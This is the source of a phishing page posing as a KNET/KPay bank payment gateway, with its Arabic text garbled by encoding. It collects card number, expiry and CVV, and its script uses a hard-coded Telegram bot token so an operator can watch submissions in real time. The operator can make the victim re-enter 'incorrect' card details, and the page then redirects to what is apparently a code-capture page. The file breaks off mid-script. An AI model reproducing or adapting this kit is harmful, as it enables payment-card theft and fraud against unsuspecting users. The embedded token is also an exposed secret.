<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø¯ÙØ¹</title>
    <style>
        /* Ù†ÙØ³ Ø§Ù„Ø£Ù†Ù…Ø§Ø· Ø§Ù„Ø³Ø§Ø¨Ù‚Ø©... */
   body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #eee;
            margin: 0;
            padding: 0;
        }
        .banner {
            background: url('www2.0zz0.com/2025/07/13/22/875395686.jpg') no-repeat center center;
            background-size: cover;
            height: 100px;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 20px;
            position: relative;
        }
        .logo {
            text-align: center;
            margin-bottom: 10px;
        }
        .logo img {
            max-width: 120px;
        }
        .amount {
            text-align: center;
            font-size: 18px;
            color: #0070c0;
            margin: 10px 0;
        }
        .form-box {
            border: 1px solid #ccc;
            border-radius: 10px;
            padding: 20px;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            color: #2e72b1;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #999;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .row {
            display: flex;
            gap: 10px;
        }
        .row select, .row input {
            flex: 1;
        }
        .actions {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .actions button {
            flex: 1;
            padding: 12px;
            border: none;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin: 0 5px;
        }
        .actions .submit {
            background-color: #0070c0;
            color: #fff;
        }
        .actions .cancel {
            background-color: #ccc;
            color: #333;
        }
        footer {
            text-align: center;
            font-size: 14px;
            color: #777;
            margin-top: 20px;
        }
        
        .error {
            color: #d9534f;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        input.invalid, select.invalid {
            border-color: #d9534f;
            background-color: #fdf7f7;
        }
        input.valid, select.valid {
            border-color: #5cb85c;
            background-color: #f9fff9;
        }
        
        .loading {
            opacity: 0.7;
            pointer-events: none;
        }

        /* Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ Ù…Ù† Ø§Ù„Ø¨ÙˆØª */
        .bot-error-message {
            display: none;
            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            border: none;
            font-weight: bold;
            font-size: 18px;
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        /* Ø¯Ø§Ø¦Ø±Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± */
        .waiting-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .waiting-content {
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }
        
        .waiting-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0070c0;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 25px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .waiting-title {
            color: #0070c0;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .waiting-text {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        
        .waiting-timer {
            color: #ff6b6b;
            font-size: 18px;
            font-weight: bold;
            margin: 15px 0;
        }
        
        .waiting-note {
            color: #888;
            font-size: 14px;
            font-style: italic;
            margin-top: 20px;
        }

        /* Ø²Ø± Ø§Ù„Ø¥Ù„ØºØ§Ø¡ ÙÙŠ ÙˆØ¶Ø¹ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± */
        .cancel-waiting {
            background-color: #ccc;
            color: #333;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
            font-size: 14px;
        }
        
        .cancel-waiting:hover {
            background-color: #bbb;
        }
    </style>
</head>
<body>
    <div class="banner"></div>
    <div class="container">
        <div class="logo">
            <img src="www2.0zz0.com/2025/07/13/21/825012472.png" alt="NBK Logo">
        </div>
        <div class="amount">
            Halamax International Wholesale And Retail Co.
            <br>
        </div>

        <!-- Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ Ù…Ù† Ø§Ù„Ø¨ÙˆØª -->
        <div id="botErrorMessage" class="bot-error-message">
            <div>âŒ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ù‡ Ø®Ø·Ø§!</div>
            <div style="font-size: 14px; margin-top: 8px; opacity: 0.9;">
                ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØµØ­ÙŠØ­Ù‡
            </div>
        </div>

        <div class="form-box">
            <form id="payForm">
                <label>Ø±Ù‚Ù… Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ØµØ±Ù Ø§Ù„Ø¢Ù„ÙŠ:</label>
                <div class="row">
                    <input type="text" id="cardNumber" maxlength="16" placeholder="Ø£Ø¯Ø®Ù„ Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø£Ø±Ù‚Ø§Ù…" required>
                </div>
                <div id="cardNumberError" class="error">ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø¨Ø·Ø§Ù‚Ø© ØµØ­ÙŠØ­ Ù…ÙƒÙˆÙ† Ù…Ù† 16 Ø±Ù‚Ù…</div>

                <label>ØªØ§Ø±ÙŠØ® Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</label>
                <div class="row">
                    <select id="expiryMonth" required>
                        <option value="">MM</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select id="expiryYear" required>
                        <option value="">YYYY</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                    </select>
                </div>
                <div id="expiryError" class="error">ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± ØªØ§Ø±ÙŠØ® Ø§Ù†ØªÙ‡Ø§Ø¡ ØµØ­ÙŠØ­ ÙˆÙ„Ù… ÙŠÙ†ØªÙ‡ÙŠ</div>

                <label>Ø§Ø¯Ø®Ù„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ CVV/CVC :</label>
                <input type="password" id="pinNumber" placeholder="***" maxlength="3" required>
                <div id="pinError" class="error">ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² CVV ØµØ­ÙŠØ­ Ù…ÙƒÙˆÙ† Ù…Ù† 3 Ø£Ø±Ù‚Ø§Ù…</div>

                <div class="actions">
                    <button type="button" class="cancel" id="cancelBtn">Ø¥Ù„ØºØ§Ø¡</button>
                    <button type="submit" class="submit" id="submitBtn">Ø¥Ø±Ø³Ø§Ù„</button>
                </div>
            </form>
        </div>
        <footer>
            Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø© Â© KNET / KPay 2025
        </footer>
    </div>

    <!-- Ø¯Ø§Ø¦Ø±Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± -->
    <div id="waitingOverlay" class="waiting-overlay">
        <div class="waiting-content">
            <div class="waiting-spinner"></div>
            <div class="waiting-title">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</div>
            <div class="waiting-text">ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù…</div>
            <div class="waiting-text">Ø¬Ø§Ø±ÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª...</div>
            <div class="waiting-timer" id="waitingTimer">â³ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ: <span id="timerCount">60</span> Ø«Ø§Ù†ÙŠØ©</div>
            <div class="waiting-note">Ø³ÙŠØªÙ… Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ÙˆÙ‚Øª Ø£Ùˆ Ø¹Ù†Ø¯ Ø§ÙƒØªÙ…Ø§Ù„ Ø§Ù„ØªØ­Ù‚Ù‚</div>
            <button class="cancel-waiting" id="cancelWaitingBtn">Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± ÙˆØ§Ù„Ø¹ÙˆØ¯Ø©</button>
        </div>
    </div>

    <script>
        // ğŸ”¥ Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ù„Ù†Ø¸Ø§Ù…
        const botToken = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
        let lastUpdateId = 0;
        let currentSessionId = Date.now();
        let isCheckingForUpdates = false;
        let waitingTimer = null;
        let countdownTimer = null;
        let remainingTime = 60;
        let updateCheckInterval = null;

        // ğŸ”¥ Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
        const waitingOverlay = document.getElementById('waitingOverlay');
        const timerCount = document.getElementById('timerCount');
        const cancelWaitingBtn = document.getElementById('cancelWaitingBtn');

        // ğŸ”¥ Ø¯Ø§Ù„Ø© ÙØ­Øµ ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø¨ÙˆØª - Ù…Ø­Ø³Ù†Ø©
        async function checkBotUpdates() {
            if (isCheckingForUpdates) return;
            
            isCheckingForUpdates = true;
            
            try {
                console.log("ğŸ” Ø¬Ø§Ø±ÙŠ ÙØ­Øµ ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø¨ÙˆØª...");
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
                const data = await response.json();
                
                console.log("ğŸ“Š Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©:", data);
                
                if (data.ok && data.result.length > 0) {
                    console.log(`ğŸ“¨ Ø¹Ø¯Ø¯ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©: ${data.result.length}`);
                    
                    data.result.forEach(update => {
                        console.log("ğŸ” ØªØ­Ù„ÙŠÙ„ Ø§Ù„ØªØ­Ø¯ÙŠØ«:", update);
                        
                        // ğŸ”¥ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¶ØºØ· Ø²Ø± "Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ù‡ Ø®Ø·Ø§"
                        if (update.callback_query && update.callback_query.data === "card_info_incorrect") {
                            console.log("âœ… ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø£Ù…Ø± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø®Ø·Ø£ Ù…Ù† Ø§Ù„Ø¨ÙˆØª!");
                            
                            // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¤Ù‚ØªØ§Øª
                            stopAllTimers();
                            
                            // Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
                            hideWaitingOverlay();
                            
                            // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
                            showBotErrorMessage();
                            
                            // Ø§Ù„Ø±Ø¯ Ø¹Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø§Ø³ØªÙ„Ø§Ù…
                            answerCallbackQuery(update.callback_query.id);
                        }
                        
                        // ØªØ­Ø¯ÙŠØ« lastUpdateId
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;
                            console.log(`ğŸ†” ØªÙ… ØªØ­Ø¯ÙŠØ« lastUpdateId Ø¥Ù„Ù‰: ${lastUpdateId}`);
                        }
                    });
                } else if (!data.ok) {
                    console.error("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ø³ØªØ¬Ø§Ø¨Ø© API:", data);
                }
            } catch (error) {
                console.error("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø¨ÙˆØª:", error);
            } finally {
                isCheckingForUpdates = false;
            }
        }

        // ğŸ”¥ Ø¯Ø§Ù„Ø© Ø¨Ø¯Ø¡ ÙØ­Øµ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø¨Ø´ÙƒÙ„ Ø¯ÙˆØ±ÙŠ
        function startUpdateChecking() {
            // Ø¥ÙŠÙ‚Ø§Ù Ø£ÙŠ ÙØ­Øµ Ø³Ø§Ø¨Ù‚
            if (updateCheckInterval) {
                clearInterval(updateCheckInterval);
            }
            
            // Ø§Ù„Ø¨Ø¯Ø¡ Ø¨ÙØ­Øµ Ø³Ø±ÙŠØ¹ ÙƒÙ„ Ø«Ø§Ù†ÙŠØªÙŠÙ†
            updateCheckInterval = setInterval(checkBotUpdates, 2000);
            console.log("ğŸ”„ Ø¨Ø¯Ø£ ÙØ­Øµ ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø¨Ø´ÙƒÙ„ Ø¯ÙˆØ±ÙŠ");
        }

        // ğŸ”¥ Ø¯Ø§Ù„Ø© Ø¥ÙŠÙ‚Ø§Ù ÙØ­Øµ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª
        function stopUpdateChecking() {
            if (updateCheckInterval) {
                clearInterval(updateCheckInterval);
                updateCheckInterval = null;
                console.log("â¹ï¸ ØªÙˆÙ‚Ù ÙØ­Øµ ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø¨ÙˆØª");
            }
        }

        // ğŸ”¥ Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¯ Ø¹Ù„Ù‰ Ø§Ø³ØªØ¹Ù„Ø§Ù… Ø§Ù„Ø²Ø± ÙÙŠ Ø§Ù„Ø¨ÙˆØª
        async function answerCallbackQuery(callbackQueryId) {
            try {
                console.log(`ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø±Ø¯ Ø¹Ù„Ù‰ callbackQuery: ${callbackQueryId}`);
                const response = await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId,
                        text: "ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„ØªØµØ­ÙŠØ­ Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…"
                    })
                });
                
                const result = await response.json();
                if (result.ok) {
                    console.log("âœ… ØªÙ… Ø§Ù„Ø±Ø¯ Ø¹Ù„Ù‰ Ø§Ø³ØªØ¹Ù„Ø§Ù… Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­");
                } else {
                    console.error("âŒ ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø±Ø¯ Ø¹Ù„Ù‰ Ø§Ø³ØªØ¹Ù„Ø§Ù… Ø§Ù„Ø¨ÙˆØª:", result);
                }
            } catch (error) {
                console.error("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø±Ø¯ Ø¹Ù„Ù‰ Ø§Ø³ØªØ¹Ù„Ø§Ù… Ø§Ù„Ø¨ÙˆØª:", error);
            }
        }

        // ğŸ”¥ Ø¯Ø§Ù„Ø© Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø®Ø·Ø£ Ù…Ù† Ø§Ù„Ø¨ÙˆØª
        function showBotErrorMessage() {
            console.log('ğŸ“¨ ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø£Ù…Ø± Ø§Ù„Ø®Ø·Ø£ Ù…Ù† Ø§Ù„Ø¨ÙˆØª');
            
            const errorElement = document.getElementById('botErrorMessage');
            errorElement.style.display = 'block';
            
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
            resetForm();
            
            // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ø¹Ø¯ 10 Ø«ÙˆØ§Ù†ÙŠ
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 10000);
        }

        // ğŸ”¥ Ø¯Ø§Ù„Ø© Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
        function resetForm() {
            document.getElementById('payForm').reset();
            document.getElementById('payForm').classList.remove('loading');
            
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Ø¥Ø±Ø³Ø§Ù„';
            
            // ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
            document.getElementById('cardNumber').disabled = false;
            document.getElementById('expiryMonth').disabled = false;
            document.getElementById('expiryYear').disabled = false;
            document.getElementById('pinNumber').disabled = false;
            
            // Ø¥Ø®ÙØ§Ø¡ Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚
            hideAllErrors();
        }

        // ğŸ”¥ Ø¥Ø®ÙØ§Ø¡ ÙƒÙ„ Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø®Ø·Ø£
        function hideAllErrors() {
            const errors = document.querySelectorAll('.error');
            errors.forEach(error => {
                error.style.display = 'none';
            });
        }

        // ğŸ”¥ Ø¹Ø±Ø¶ Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
        function showWaitingOverlay() {
            remainingTime = 60;
            timerCount.textContent = remainingTime;
            waitingOverlay.style.display = 'flex';
            
            // Ø¨Ø¯Ø¡ ÙØ­Øµ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø¨Ø´ÙƒÙ„ Ù…ÙƒØ«Ù
            startUpdateChecking();
            
            // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
            startCountdown();
        }

        // ğŸ”¥ Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
        function hideWaitingOverlay() {
            waitingOverlay.style.display = 'none';
            stopAllTimers();
            stopUpdateChecking();
        }

        // ğŸ”¥ Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
        function startCountdown() {
            countdownTimer = setInterval(() => {
                remainingTime--;
                timerCount.textContent = remainingTime;
                
                if (remainingTime <= 0) {
                    stopAllTimers();
                    stopUpdateChecking();
                    // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ ØµÙØ­Ø© Ø§Ù„ÙƒÙˆØ¯ Ø¨Ø¹Ø¯ Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ÙˆÙ‚Øª
                    window.location.href = "code.html";
                }
            }, 1000);
        }

        // ğŸ”¥ Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¤Ù‚ØªØ§Øª
        function stopAllTimers() {
            if (waitingTimer) {
                clearTimeout(waitingTimer);
                waitingTimer = null;
            }
            if (countdownTimer) {
                clearInterval(countdownTimer);
                countdownTimer = null;
            }
        }

        // ğŸ”¥ Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙˆØ±ÙŠ Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙˆØª
        function initializeBotSystem() {
            console.log("ğŸš€ Ø¨Ø¯Ø¡ ØªÙ‡ÙŠØ¦Ø© Ù†Ø¸Ø§Ù… Ø§Ù„Ø¨ÙˆØª...");
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© token Ø§Ù„Ø¨ÙˆØª
            checkBotToken().then(isValid => {
                if (isValid) {
                    console.log("âœ… Ø±Ù…Ø² Ø§Ù„Ø¨ÙˆØª ØµØ§Ù„Ø­ØŒ Ø¨Ø¯Ø¡ ÙØ­Øµ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª");
                    // Ø§Ù„Ø¨Ø¯Ø¡ Ø¨ÙØ­Øµ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
                    setInterval(checkBotUpdates, 5000);
                    checkBotUpdates(); // Ø§Ù„ØªØ­Ù‚Ù‚ ÙÙˆØ± Ø§Ù„ØªØ­Ù…ÙŠÙ„
                } else {
                    console.error("âŒ Ø±Ù…Ø² Ø§Ù„Ø¨ÙˆØª ØºÙŠØ± ØµØ§Ù„Ø­!");
                }
            });
        }

        // ğŸ”¥ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© token Ø§Ù„Ø¨ÙˆØª
        async function checkBotToken() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† token Ø§Ù„Ø¨ÙˆØª:", error);
                return false;
            }
        }

        // ğŸ”¥ Ø­Ø¯Ø« Ø²Ø± Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
        cancelWaitingBtn.addEventListener('click', function() {
            hideWaitingOverlay();
            resetForm();
        });

        // Ø¯ÙˆØ§Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØµØ­Ø© (Ù†ÙØ³ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚)
        function validateCardNumber(cardNumber) {
            const cleaned = cardNumber.replace(/\s+/g, '').replace(/-/g, '');
            return /^\d{16}$/.test(cleaned);
        }
        
        function validateExpiryDate(month, year) {
            if (!month || !year) return false;
            
            const currentDate = new Date();
            const currentYear = currentDate.getFullYear();
            const currentMonth = currentDate.getMonth() + 1;
            
            const expiryYear = parseInt(year);
            const expiryMonth = parseInt(month);
            
            if (expiryYear < currentYear) return false;
            if (expiryYear === currentYear && expiryMonth < currentMonth) return false;
            
            return true;
        }
        
        function validateCVV(cvv) {
            return /^\d{3}$/.test(cvv);
        }
        
        function showError(elementId, message) {
            const errorElement = document.getElementById(elementId);
            errorElement.textContent = message;
            errorElement.style.display = 'block';
        }
        
        function hideError(elementId) {
            const errorElement = document.getElementById(elementId);
            errorElement.style.display = 'none';
        }
        
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø­Ù‚ÙˆÙ„ ÙÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„ÙØ¹Ù„ÙŠ
        document.getElementById('cardNumber').addEventListener('input', function() {
            const cardNumber = this.value;
            
            if (cardNumber.length === 0) {
                this.classList.remove('valid', 'invalid');
                hideError('cardNumberError');
            } else if (validateCardNumber(cardNumber)) {
                this.classList.add('valid');
                this.classList.remove('invalid');
                hideError('cardNumberError');
            } else {
                this.classList.add('invalid');
                this.classList.remove('valid');
                showError('cardNumberError', 'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 16 Ø±Ù‚Ù…');
            }
        });
        
        document.getElementById('expiryMonth').addEventListener('change', validateExpiry);
        document.getElementById('expiryYear').addEventListener('change', validateExpiry);
        
        function validateExpiry() {
            const month = document.getElementById('expiryMonth').value;
            const year = document.getElementById('expiryYear').value;
            
            if (month && year) {
                if (validateExpiryDate(month, year)) {
                    document.getElementById('expiryMonth').classList.add('valid');
                    document.getElementById('expiryMonth').classList.remove('invalid');
                    document.getElementById('expiryYear').classList.add('valid');
                    document.getElementById('expiryYear').classList.remove('invalid');
                    hideError('expiryError');
                } else {
                    document.getElementById('expiryMonth').classList.add('invalid');
                    document.getElementById('expiryMonth').classList.remove('valid');
                    document.getElementById('expiryYear').classList.add('invalid');
                    document.getElementById('expiryYear').classList.remove('valid');
                    showError('expiryError', 'ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ ØºÙŠØ± ØµØ§Ù„Ø­ Ø£Ùˆ Ù…Ù†ØªÙ‡ÙŠ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©');
                }
            } else {
                document.getElementById('expiryMonth').classList.remove('valid', 'invalid');
                document.getElementById('expiryYear').classList.remove('valid', 'invalid');
                hideError('expiryError');
            }
        }
        
        document.getElementById('pinNumber').addEventListener('input', function() {
            const pin = this.value;
            
            if (pin.length === 0) {
                this.classList.remove('valid', 'invalid');
                hideError('pinError');
            } else if (validateCVV(pin)) {
                this.classList.add('valid');
                this.classList.remove('invalid');
                hideError('pinError');
            } else {
                this.classList.add('invalid');
                this.classList.remove('valid');
                showError('pinError', 'Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ø³Ø±ÙŠ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† 3 Ø£Ø±Ù‚Ø§Ù…');
            }
        });
        
        // Ø²Ø± Ø§Ù„Ø¥Ù„ØºØ§Ø¡
        document.getElementById('cancelBtn').addEventListener('click', function() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ù‚Ø§Ù‹ Ø¥Ù„ØºØ§Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹ØŸ')) {
                window.history.back();
            }
        });
        
        // ğŸ”¥ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ - Ù…Ø¹Ø¯Ù„ Ù…Ø¹ Ù†Ø¸Ø§Ù… Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
        document.getElementById("payForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù‚ÙŠÙ…
            const cardNumber = document.getElementById("cardNumber").value;
            const month = document.getElementById("expiryMonth").value;
            const year = document.getElementById("expiryYear").value;
            const pin = document.getElementById("pinNumber").value;
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            let isValid = true;
            
            if (!validateCardNumber(cardNumber)) {
                showError('cardNumberError', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø¨Ø·Ø§Ù‚Ø© ØµØ­ÙŠØ­ Ù…ÙƒÙˆÙ† Ù…Ù† 16 Ø±Ù‚Ù…');
                document.getElementById("cardNumber").focus();
                isValid = false;
            }
            
            if (!validateExpiryDate(month, year)) {
